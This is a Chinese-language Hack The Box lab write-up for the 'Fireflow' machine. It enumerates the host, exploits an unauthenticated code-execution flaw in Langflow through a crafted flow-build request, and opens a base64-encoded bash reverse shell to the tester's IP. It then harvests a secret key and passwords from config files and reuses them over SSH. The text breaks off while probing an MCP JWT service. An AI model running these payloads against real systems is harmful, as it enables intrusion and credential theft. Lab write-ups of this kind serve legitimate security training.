---
title: HTB Fireflow：从 Langflow RCE、MCP JWT 伪造到 Kubernetes Root
date: 2026-07-17
category: 网络安全
tags: HTB,Linux
---

# HTB Fireflow：从 Langflow RCE、MCP JWT 伪造到 Kubernetes Root

![[file-20260711222033028.png]]

## 一、nmap

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n 10.129.244.214 -T4 --min-rate 5000 -oA tcp-ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-12 21:49 EDT
Nmap scan report for 10.129.244.214
Host is up (0.0082s latency).
Not shown: 62762 closed tcp ports (reset), 2771 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```

针对开放端口进行详细扫描：

```bash
$ sudo nmap -sV -sC -p 22,443 --reason -Pn -n 10.129.244.214 -oA tcp-ports-detail
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-12 21:52 EDT
Nmap scan report for 10.129.244.214
Host is up, received user-set (0.0072s latency).

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http syn-ack ttl 63 nginx
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://fireflow.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```

SSL 证书中的 SAN（Subject Alternative Name）字段暴露了两个域名：

```
fireflow.htb
flow.fireflow.htb
```

将它们添加到本地 `hosts` 文件中：

```bash
echo '10.129.244.214 fireflow.htb flow.fireflow.htb' | sudo tee -a /etc/hosts
10.129.244.214 fireflow.htb flow.fireflow.htb

tail -n 1 /etc/hosts
10.129.244.214 fireflow.htb flow.fireflow.htb
```

直接访问 `https://10.129.244.214` 应该会得到一个重定向响应，目的地址：

```
https://fireflow.htb/
```

依据是扫描结果中的：

```
http-title: Did not follow redirect to https://fireflow.htb/
```

nmap 之所以没有跟随重定向，是因为脚本中写明，当遇到 30x 的响应码的时候，若“重定向目的地址”并不和扫描指定地址（我指定的是 IP）同源，则中断跳转，并给出提示：

```
http-title: Did not follow redirect to ……
```

验证一下：

```bash
curl https://10.129.244.214 -I -k
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Mon, 13 Jul 2026 02:27:36 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: https://fireflow.htb/
```

确实是重定向操作，目的地址也没错。

## 二、fireflow.htb

```bash
curl https://fireflow.htb -I -k
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 13 Jul 2026 02:23:36 GMT
Content-Type: text/html
Content-Length: 12913
Last-Modified: Thu, 30 Apr 2026 09:55:55 GMT
Connection: keep-alive
ETag: "69f3272b-3271"
X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Accept-Ranges: bytes
```

![[file-20260713105740053.png]]

描述的是一个名为 FireFlow 的情报自动化平台，其核心目标是穿透代理层干扰和勒索软件的烟幕，直接定位那些保持安静、可否认的真实访问路径。

页面中的大多数按钮都是指向本页的各个锚点，并没有跳转到其他的目录或者网站。

其中有一个叫做 Nightfall AI Agent 的，可以访问体验：

![[file-20260713111912597.png]]

其目的地址是之前发现的 `flow.fireflow.htb`。

## 三、flow.fireflow.htb

通过点击按钮，来到：

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

![[file-20260713112439379.png]]

看着像 AI 对话界面，页面提示说“通过输入提示词来测试 flow”，而且输入框中已经准备了一段问候短语，尝试“Send”：

![[file-20260713112932671.png]]

似乎无论发送什么，回复的总是：

```
We are extremely sorry, this is still under development. Please, check back soon...
```

左下角的“Built with Langflow”暴露了其后端使用的框架为 LangFlow（官网：`https://www.langflow.org/`）。

简单介绍一下：Langflow 是一个开源的、基于 Python 的可定制框架，专为构建 AI 应用程序而设计。它通过直观的工具和灵活的架构，帮助开发者快速将创意转化为实际的 AI 解决方案：

- **可视化拖拽编辑器**：你可以像搭积木一样，通过拖拽和连接不同的组件节点（如输入、输出、LLM 等）来快速设计、测试和调整你的 AI Flows。
- **支持多种应用**：能够用于开发聊天机器人、文档分析系统、内容生成器以及 Agent 应用。
- **高灵活性**：它支持 MCP，并且不强求你使用特定的 LLM 或向量数据库，选择非常自由。
- **实时测试与部署**：内置 Playground 让你能实时测试工作流并获得反馈。搭建好的工作流可以通过 API 嵌入到你自己的应用代码中，也可以直接部署到服务器上。
- **强大的扩展性**：除了使用官方的预建组件，你还可以自己编写或使用他人分享的自定义 Python 组件。

在其官网上能看到版本号的命名格式：

![[file-20260713114004260.png]]

构造正则表达式在源码中搜索是否暴露了版本号：

```bash
[^- ,\d]1\.\d+\.\d+
```

能看到：

![[file-20260713114545918.png]]

但这是 Langflow 中的一个组件（Langflow Embedded Chat）的版本号，该组件能将 Langflow 中制作好的 AI Flow 嵌入到任意网站或者 Web 应用中。

我打算尝试访问该站点的根目录：

![[file-20260713114816945.png]]

会跳转到登入/注册界面。

尝试用弱密码登入：

```
username: admin
password: admin
```

![[file-20260713142335035.png]]

会向 `/api/v1/login` 接口发送 POST 请求。

从报错响应中，无法判断“用户是否存在”这一信息。

而且我发现：当你停留在登入页面上，浏览器会不断地向两个 API（`/api/v1/auto_login` 和 `/health_check`）发送 GET 请求：

![[file-20260713142714860.png]]

访问 `/api/v1/auto_login` 得到的响应码是 403，而且从响应内容能知道“自动登入”这一功能被禁用：

```bash
curl https://flow.fireflow.htb/api/v1/auto_login -k -s | jq
{
  "detail": {
    "message": "Auto login is disabled.",
    "auto_login": false
  }
}
```

访问 `health_check` 会得到下述响应：

```bash
curl https://flow.fireflow.htb/health_check -k -s | jq
{
  "status": "ok",
  "chat": "ok",
  "db": "ok"
}
```

这似乎不是对客户端状态的检测，而是针对服务端的。从信息来看，一切都正常。

尝试注册一个用户：

```
username: hacker
password: hacker
```

![[file-20260713143621818.png]]

提示：

```
账户已经创建，等待管理员激活
```

尝试登入：

![[file-20260713143728001.png]]

给了 400 响应码，并提示“需要等管理员批准”。

## 四、枚举

### 1、fireflow.htb

```bash
$ feroxbuster -u https://fireflow.htb -k -o fireflow

404      GET        7l       11w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      298l     1276w    12913c https://fireflow.htb/
```

没什么信息。

### 2、flow.fireflow.htb

```bash
$ feroxbuster -u https://flow.fireflow.htb -k -o flow-fireflow

200      GET       24l       75w     1142c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        1l        4w       51c https://flow.fireflow.htb/logs
404      GET        1l        2w       22c https://flow.fireflow.htb/api
200      GET       81l      240w     3012c https://flow.fireflow.htb/docs/oauth2-redirect
200      GET        1l     3948w   145330c https://flow.fireflow.htb/openapi.json
200      GET       32l       66w     1007c https://flow.fireflow.htb/docs
200      GET        1l        1w       15c https://flow.fireflow.htb/health
404      GET        1l        2w       22c https://flow.fireflow.htb/api-doc
404      GET        1l        2w       22c https://flow.fireflow.htb/apis
404      GET        1l        2w       22c https://flow.fireflow.htb/api_test
404      GET        1l        2w       22c https://flow.fireflow.htb/api3
404      GET        1l        2w       22c https://flow.fireflow.htb/api4
404      GET        1l        2w       22c https://flow.fireflow.htb/api2
```

过滤出 200 响应：

```bash
$ cat flow-fireflow | grep '^200'
200      GET       81l      240w     3012c https://flow.fireflow.htb/docs/oauth2-redirect
200      GET        1l     3948w   145330c https://flow.fireflow.htb/openapi.json
200      GET       32l       66w     1007c https://flow.fireflow.htb/docs
200      GET        1l        1w       15c https://flow.fireflow.htb/health
```

在 `openapi.json` 目录中，能看到 Langflow 的版本号：

```bash
curl https://flow.fireflow.htb/openapi.json -k -s | jq | head -6
{
  "openapi": "3.1.0",
  "info": {
    "title": "Langflow",
    "version": "1.8.2"
  },
```

其实早在 `https://fireflow.htb` 中就能看到该版本信息：

![[file-20260713122410828.png]]

> 这个细节我是在整理 WP 的时候才发现的，打的时候根本没注意。AI 制作出来的网页的字体普遍较小、信息密度大，而且当你提供“网络安全”相关的上下文的时候，默认页面样式就是这种纯黑背景 + 暗淡的文字。一些细节信息感觉要用“放大工具”才能看得清……

AI 制作内容的时候，常常会在功能旁做额外的解释或者体现“提示词中的相关内容”，就比如你跟 AI 提到过“框架：Langflow 1.8.2”，AI 在设计相关功能的时候，就可能会暴露这个信息。当然，这只是我个人使用 AI 下来的相关体验（可能不准确）。

`openapi.json` 是由 OPENAPI 组件（`https://www.openapis.org/`）维护的该站点的 API 调用文档，后续如果有调用 API 的需求，也许用得上。

`/health` 页面返回：

```bash
curl -k https://flow.fireflow.htb/health
{"status":"ok"}
```

看着像之前看到的状态检测，但是这里信息量没之前的丰富。

还有两个 200 响应的是 Swagger UI 的标准路径：

```
https://flow.fireflow.htb/docs/oauth2-redirect
https://flow.fireflow.htb/docs
```

| 路径                      | 作用                                                 |
| ----------------------- | -------------------------------------------------- |
| `/docs`                 | Swagger UI 主页面（交互式 API 文档）                         |
| `/docs/oauth2-redirect` | OAuth2 授权回调页面（Swagger UI 在做 OAuth2 流程时需要用到的重定向处理页） |

但当你用浏览器访问的时候，会发现页面是空白的，因为 JS、样式和图片都加载失败了：

![[file-20260713145849851.png]]

但 `/docs` 本质是对 `openapi.json` 界面的美化，其实不看也没什么信息上的遗漏。

### 3、虚拟主机

```bash
$ ffuf -u https://10.129.244.214 -H 'Host: FUZZ.fireflow.htb' -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhost -fs 162

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 10ms]
```

都是已知信息。

我并不打算换更大的字典再次进行扫描，因为当前：

```
版本号 + 框架 → 找已知 CVE
```

是一个非常明确的路径。

## 五、CVE-2026-33017

![[file-20260713150342826.png]]

CVE 官方对其的描述：

![[file-20260713150606167.png]]

在低于 `1.9.0` 的 Langflow 版本中，其接口：

```http
POST /api/v1/build_public_tmp/{flow_id}/flow
```

存在设计缺陷。这个接口原本是用于在无需身份验证的情况下使用公开的 Flow 的。

什么是 Flow 呢？

我在本地部署了这个项目，创建一个 FLow：

![[file-20260713223257866.png]]

进入后，可以看到一个大画布，左侧有很多的功能模块/组件。你可以根据需求构建工作流（Flow）：

![[file-20260714142446991.png]]

我创建了最简单的 Flow —— 输入即输出。通过右上角的 Playground 即可运行该 Flow：

![[file-20260714143557917.png]]

进入 Playground，看到的界面就和之前看到的一致。输入信息并发送后，会按照 Flow 的设定运转，即我输入“Hello~”，输出也会是“Hello~”：

![[file-20260713223401900.png]]

当你觉得自己设计的 Flow 不错，就可以通过 Shareable Playground 分享你的 Flow：

![[file-20260713223713000.png]]

根据源码的设定，只需要请求头中存在 `client_id` Cookie（无论何值）就可以访问公开 Flow。

本题中的 Flow 就是公开的，查看 HTTP 报文就可以看到 Cookie 字段被赋值：

![[file-20260714144416534.png]]

开发者为了防止“用户觉得功能不够用”，你还可以直接在 Flow 中编写 Python 代码，创建专属的自定义组件：

![[file-20260714144621372.png]]

这必然涉及到 Python 代码的运行，而 Python 中存在可以执行系统命令的库。

依旧是最简单的实现：

![[file-20260714162442212.png]]

其预设的 Python 代码如下：

```python
import importlib

from langchain_experimental.utilities import PythonREPL

from lfx.custom.custom_component.component import Component
from lfx.io import MultilineInput, Output, StrInput
from lfx.schema.data import Data


class PythonREPLComponent(Component):
    display_name = "Python Interpreter"
    description = "Run Python code with optional imports. Use print() to see the output."
    documentation: str = "https://docs.langflow.org/python-interpreter"
    icon = "square-terminal"

    inputs = [
        StrInput(
            name="global_imports",
            display_name="Global Imports",
            info="A comma-separated list of modules to import globally, e.g. 'math,numpy,pandas'.",
            value="math,pandas",
            required=True,
        ),
        MultilineInput(
            name="python_code",
            display_name="Python Code",
            info="The Python code to execute. Only modules specified in Global Imports can be used.",
            value="print('Hello, World!')",
            input_types=["Message"],
            tool_mode=True,
            required=True,
        ),
    ]

    outputs = [
        Output(
            display_name="Results",
            name="results",
            type_=Data,
            method="run_python_repl",
        ),
    ]

    def get_globals(self, global_imports: str | list[str]) -> dict:
        """Create a globals dictionary with only the specified allowed imports."""
        global_dict = {}

        try:
            if isinstance(global_imports, str):
                modules = [module.strip() for module in global_imports.split(",")]
            elif isinstance(global_imports, list):
                modules = global_imports
            else:
                msg = "global_imports must be either a string or a list"
                raise TypeError(msg)

            for module in modules:
                try:
                    imported_module = importlib.import_module(module)
                    global_dict[imported_module.__name__] = imported_module
                except ImportError as e:
                    msg = f"Could not import module {module}: {e!s}"
                    raise ImportError(msg) from e

        except Exception as e:
            self.log(f"Error in global imports: {e!s}")
            raise
        else:
            self.log(f"Successfully imported modules: {list(global_dict.keys())}")
            return global_dict

    def run_python_repl(self) -> Data:
        try:
            globals_ = self.get_globals(self.global_imports)
            python_repl = PythonREPL(_globals=globals_)
            result = python_repl.run(self.python_code)
            result = result.strip() if result else ""

            self.log("Code execution completed successfully")
            return Data(data={"result": result})

        except ImportError as e:
            error_message = f"Import Error: {e!s}"
            self.log(error_message)
            return Data(data={"error": error_message})

        except SyntaxError as e:
            error_message = f"Syntax Error: {e!s}"
            self.log(error_message)
            return Data(data={"error": error_message})

        except (NameError, TypeError, ValueError) as e:
            error_message = f"Error during execution: {e!s}"
            self.log(error_message)
            return Data(data={"error": error_message})

    def build(self):
        return self.run_python_repl
```

大致流程：用户填写模块列表，它动态导入之后，构造 PythonREPL 执行环境来执行用户输入的 Python 代码，并且收集代码中的 `print()` 输出，最终包装成 `Data` 输出：

成功时：

```
{
  "result": "程序输出"
}
```

失败时：

```
{
  "error": "错误信息"
}
```

我导入了 `os` 模块，准备尝试命令执行：

![[file-20260714164850639.png]]

输出了我的主机名和用户。

我通过抓包抓到了：

```http
POST /api/v1/build/1950c4d2-9064-4f0e-88be-79ec06f3f433/flow
……
```

该接口就是 CVE 描述中提到的不安全的 API。

请求正文是一大长串的 JSON 格式的数据，其中包含要执行的 Python 代码：

```http
POST /api/v1/build/1950c4d2-9064-4f0e-88be-79ec06f3f433/flow?start_component_id=ChatInput-2W00E&log_builds=true&event_delivery=streaming HTTP/1.1
Host: localhost:7860
Content-Length: 29644
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Content-Type: application/json
sec-ch-ua-mobile: ?0
Accept: */*
Origin: http://localhost:7860
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:7860/flow/1950c4d2-9064-4f0e-88be-79ec06f3f433
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkN2M1MzBjNi05NjI4LTQzYjQtOWFjYy03YzA0OTc0YjlhYmQiLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxODE1NTQ3ODk0fQ.9xto19XaYa3UG3jdnf7mBHfUY9H2ayBPy8b39xvnGu0; apikey_tkn_lflw=""; auto_login_lf=auto; sidebar:state=true

……
……
{"input_value":"print(os.popen('whoami').read())","session":"1950c4d2-9064-4f0e-88be-79ec06f3f433","client_request_time":1784019068297}}
```

> 完整信息我放在了附录。

支持 Python 代码运行，但没限制模块、没沙箱执行，这就是该漏洞的本质。

但是，目前我是主动使用了 Python 模块去构建 Flow，如果没使用这个，漏洞还行吗？

行的。为了更好地区分，我先规定：

- “跑起来的 Flow”称为**智能体**，没跑起来的依旧叫 **Flow**
- Flow 由一个个的**模块**构成

![[file-20260714205539502.png]]

与用户交互的智能体，看似是一个黑盒，但通过抓包，能看到其本质调用的依旧是一个个的模块。

在之前看到的请求体中，我总共能找到三个“定位”信息：

```bash
jq -r '.data.nodes[].position' t.json
{
  "x": 763.0175089593382,
  "y": 821.6624906388676
}
{
  "x": -6.202119907925379,
  "y": 819.0885088105424
}
{
  "x": 308.48481330512084,
  "y": 634.6856811796707
}
```

这个刚好对应了我设置的三个模块在画布中的具体位置。

我用图再理一遍。

用户以为的使用方式：

![[file-20260714205902295.png]]

实际的运作方式：

![[file-20260714210159806.png]]

因此，用户完全可以通过构造特殊请求体来调用不同的模块从而构造自己的 FLow。

这道题目，我看到的就仅仅只是智能体，但得到上述结论之后，我完全可以复用我当前的请求体内容，来构造能 RCE 的 Flow。

我先抓住发送信息的报文：

![[file-20260714210647507.png]]

发送到 Replay 当中，并将请求替换成之前能 RCE 的请求。而且由于没有输出内容，我将命令执行替换成 `curl` 访问我本地开启的服务，通过日志查看命令是否真正被执行：

![[file-20260714210850213.png]]

此时还需要有个细节，就是将请求后的通过 GET 传输的三个参数的第一个给删除（原本含：`?start_component_id=ChatInput-608En&log_builds=false&event_delivery=streaming`，改为 `?log_builds=false&event_delivery=streaming`，或者干脆全删）：

![[file-20260714211853808.png]]

原因很简单，第一个参数它指定了构建/执行 Flow 时的“起始组件”的 ID。但我希望的是自己构建 Flow，这个参数保留会出现冲突的现象，从而导致失败。

在本地的 4444 端口开启 HTTP 服务：

```bash
python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

发送报文：

![[file-20260714211905065.png]]

返回 200 响应，此时看日志：

```
10.129.56.199 - - [14/Jul/2026 21:18:59] "GET / HTTP/1.1" 200 -
```

这说明命令执行成功了。

## 六、User Flag

### 1、www-data shell

修改命令，做反弹 Shell。

为了防止引号冲突的问题，我先将命令进行 Base 64 编码：

```
echo -n 'bash -i >& /dev/tcp/10.10.17.96/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy45Ni80NDQ0IDA+JjE=
```

将请求体的那段命令改成：

```python
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy45Ni80NDQ0IDA+JjE= | base64 -d | bash')
```

本地监听：

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
```

发送报文后，就得到了 `www-data` 的 Shell：

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.56.199 36654
bash: cannot set terminal process group (1456): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fireflow:/var/lib/langflow$
```

先做 Shell 稳定化：

```bash
www-data@fireflow:/var/lib/langflow$ python3 --version
python3 --version
Python 3.12.3
www-data@fireflow:/var/lib/langflow$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ow$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

按 `ctrl + z` 挂起 session 后，输入：

```bash
stty raw -echo; fg
```

回到 Session 之后，再次设置环境变量：

```bash
www-data@fireflow:/var/lib/langflow$ export TERM=xterm
```

如此一来，就得到了一个稳定化的 Shell。

### 2、信息搜集

由于需要密码（但我不知道 `www-data` 的密码），因此无法查看 `sudo` 权限：

```bash
www-data@fireflow:/var/lib/langflow$ sudo -l
[sudo] password for www-data:
sudo: a password is required
```

在当前目录下，能看到一把密钥以及一个数据库：

```bash
www-data@fireflow:/var/lib/langflow$ ls -la
total 20
drwxr-xr-x  4 www-data www-data 4096 May 12 15:28 .
drwxr-xr-x 53 root     root     4096 May 12 15:56 ..
drwxr-xr-x  2 www-data www-data 4096 May 12 15:28 ba4fe756-d6f7-4c7a-a7b1-f986206878ec
-rw-r--r--  1 root     root        0 Apr  9 14:41 langflow.db
drwxr-xr-x  4 www-data www-data 4096 May 12 15:28 profile_pictures
-rw-------  1 www-data www-data   43 Jul 14 09:43 secret_key
www-data@fireflow:/var/lib/langflow$ find / -name *.env 2>/dev/null
```

这个数据库的大小为 0 字节，是空的：

```bash
www-data@fireflow:/var/lib/langflow$ wc langflow.db
0 0 0 langflow.db
```

密钥信息：

```bash
www-data@fireflow:/var/lib/langflow$ cat secret_key
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

根据格式，AI 告诉我这是 LangFlow 的 `LANGFLOW_SECRET_KEY`。

Langflow 用这个 key 做两件事情：

1. **Fernet 加密**：加密存储在数据库中的敏感信息（API Key、凭证等）。
2. **JWT 签名**：当使用 HS256 算法时，用它来签名 / 验证 JWT token。

顺着这条线，我当时有找到其他数据库文件，能找到：

```bash
www-data@fireflow:/var/lib/langflow$ find / -name *.db 2>/dev/null
/var/lib/langflow/langflow.db
/opt/langflow/venv/lib/python3.12/site-packages/langflow/langflow.db
```

进入数据，查看数据表：

```
www-data@fireflow:/var/lib/langflow$ sqlite3 /opt/langflow/venv/lib/python3.12/site-packages/langflow/langflow.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
alembic_version   folder            sso_config        user
apikey            job               sso_user_profile  variable
file              message           trace             vertex_build
flow              span              transaction
```

查看 `user` 表中的内容：

```bash
sqlite> select * from user;
ba4fe756d6f74c7aa7b1f986206878ec|langflow|$2b$12$d59pWDFLR2u.vdDOdqc.c.BAG94a5MSxYWw2vos/Cms69QptgT4F2||1|1|2026-04-09 14:41:33.707308|2026-05-07 11:46:55.182916|2026-05-07 11:46:55.180024||{"github_starred": false, "dialog_dismissed": false, "discord_clicked": false}
```

有一个 langflow 用户以及其 Hash 值。

这是一个 bcrypt hash，hashcat 的模式是 3200。但是 bcrypt 是专门设计的抗暴力破解哈希，其特性：

| 特性            | 说明                                                     |
| ------------- | ------------------------------------------------------ |
| 自适应成本因子       | cost=12 意味着 2¹² = 4096 次 Blowfish 加密，计算非常慢             |
| 内置盐           | 每次哈希都有独立 22 字符随机盐，无法使用彩虹表                              |
| 故意缓慢          | 即使是高端 GPU，bcrypt cost 12 通常只有几百到几千 H/s（而 MD5 是几十亿 H/s） |
| 抗 GPU/ASIC 优化 | 内存密集型设计，GPU 加速效果有限                                     |

我简单尝试了一下，跑了一会儿没结果就没继续下去了。

看看单点登入配置文件：

```
select * from sso_config;
select * from sso_user_profile;
```

两张表都是空的。

apikey 表：

```bash
sqlite> .dump apikey
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "apikey" (
        name VARCHAR,
        last_used_at DATETIME,
        total_uses INTEGER NOT NULL,
        is_active BOOLEAN NOT NULL,
        id CHAR(32) NOT NULL,
        created_at DATETIME DEFAULT (CURRENT_TIMESTAMP) NOT NULL,
        api_key VARCHAR NOT NULL,
        user_id CHAR(32) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (id)
);
INSERT INTO apikey VALUES('MCP Project Starter Project - langflow',NULL,0,1,'60bcac3af6d34b58b507e8b2c9c0d42b','2026-04-09 15:02:36.686948','gAAAAABp17-MVswbfDB0aaY5MutXL1_Ac60sF8voUYikhW8dG-3uxFSY3v_ClgKEiEhilKaMQonq4VyseKGmmXgxH0OFzYzb0DAoE-8mrb3nTTiz-jc935Kf6XePwwT_11TyVUU06o1B','ba4fe756d6f74c7aa7b1f986206878ec');
COMMIT;

sqlite> select name,api_key from apikey;
MCP Project Starter Project - langflow|gAAAAABp17-MVswbfDB0aaY5MutXL1_Ac60sF8voUYikhW8dG-3uxFSY3v_ClgKEiEhilKaMQonq4VyseKGmmXgxH0OFzYzb0DAoE-8mrb3nTTiz-jc935Kf6XePwwT_11TyVUU06o1B
```

似乎适用于 MCP 服务器的。

当前目录下还有一个名字很长的目录：

```
ba4fe756-d6f7-4c7a-a7b1-f986206878ec
```

进入查看，里面有一个关于 MCP Server 的文件：

```bash
www-data@fireflow:/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec$ ls
_mcp_servers_ba4fe756-d6f7-4c7a-a7b1-f986206878ec.json
```

查看：

```bash
www-data@fireflow:/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec$ cat _mcp_servers_ba4fe756-d6f7-4c7a-a7b1-f986206878ec.json | jq
{
  "mcpServers": {
    "lf-starter_project": {
      "command": "uvx",
      "args": [
        "mcp-proxy",
        "--transport",
        "streamablehttp",
        "http://127.0.0.1:7860/api/v1/mcp/project/62e121b7-b863-48a5-a69d-d5b48a0afa84/streamable"
      ]
    }
  }
}
```

根据官方文档描述，每个 Langflow 项目都会维护一个 MCP Server，上述文件是其生成的用于 MCP Client 连接的配置文件。一些 AI 或者 Agent 就可以通过该配置文件来访问 MCP Server，以此获得调用 Langflow 项目中的 Flows 的能力。

本质就是让 AI 也能正常使用 LangFlow 项目。

似乎并没有太大的作用。

查询环境变量文件：

```bash
www-data@fireflow:/var/lib/langflow$ find / -name *.env 2>/dev/null
/etc/langflow/.env
/etc/systemd/system/k3s.service.env
```

查看：

```bash
www-data@fireflow:/var/lib/langflow$ cat /etc/langflow/.env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

泄露了账密信息：

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

### 3、密码复用

直接切换用户会显示用户不存在：

```bash
www-data@fireflow:/var/lib/langflow$ su - langflow
su: user langflow does not exist or the user entry does not contain all the required fields
```

通过 SSH 登入：

```bash
sshpass -p n1ghtm4r3_b4_n1ghtf4ll ssh langflow@10.129.58.134
Permission denied, please try again.
```

因为权限原因，被拒绝了。

直接在 home 目录下还看到一个用户：

```
www-data@fireflow:/var/lib/langflow$ ls /home
nightfall
```

可能存在密码复用的现象，尝试登入这个用户：

```bash
sshpass -p n1ghtm4r3_b4_n1ghtf4ll ssh nightfall@10.129.58.134
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 16 03:03:50 AM UTC 2026

  System load:           0.3
  Usage of /:            84.6% of 15.58GB
  Memory usage:          50%
  Swap usage:            0%
  Processes:             249
  Users logged in:       0
  IPv4 address for eth0: 10.129.58.134
  IPv6 address for eth0: dead:beef::a0de:adff:febe:d3d8

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
nightfall@fireflow:~$
```

成功。

在其家目录下就能找到 User Flag：

```bash
nightfall@fireflow:~$ cat user.txt
d257******************
```

## 七、nightfall shell

该用户没有 sudo 权限：

```bash
nightfall@fireflow:~$ sudo -l
[sudo] password for nightfall:
Sorry, user nightfall may not run sudo on fireflow.
```

在家目录中有一个 `.mcp` 目录：

```bash
nightfall@fireflow:~$ ls -la
total 36
drwxr-x--- 5 nightfall nightfall 4096 May 12 15:28 .
drwxr-xr-x 3 root      root      4096 May 12 15:28 ..
lrwxrwxrwx 1 root      root         9 May 12 14:24 .bash_history -> /dev/null
-rw-r--r-- 1 nightfall nightfall  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 nightfall nightfall 3771 Mar 31  2024 .bashrc
drwx------ 2 nightfall nightfall 4096 May 12 15:28 .cache
drwxrwxr-x 3 nightfall nightfall 4096 May 12 15:28 .local
drwx------ 2 nightfall nightfall 4096 Jul 16 02:15 .mcp
-rw-r--r-- 1 nightfall nightfall  807 Mar 31  2024 .profile
-rw-r----- 1 root      nightfall   33 Jul 16 02:15 user.txt
```

其中有一个配置文件：

```bash
nightfall@fireflow:~/.mcp$ ls -la
total 12
drwx------ 2 nightfall nightfall 4096 Jul 16 02:15 .
drwxr-x--- 5 nightfall nightfall 4096 May 12 15:28 ..
-rw------- 1 nightfall nightfall  146 Jul 16 02:15 config.json
```

```bash
nightfall@fireflow:~/.mcp$ cat config.json
{
  "server": "http://10.129.58.134:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

一个 MCP Server 的 API，并且配备了账号与密码。

尝试访问：

```bash
nightfall@fireflow:~/.mcp$ curl http://10.129.58.134:30080/api/v1/version -s | jq
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": [
      "HS256",
      "none"
    ]
  },
  "docs": "/docs",
  "endpoints": [
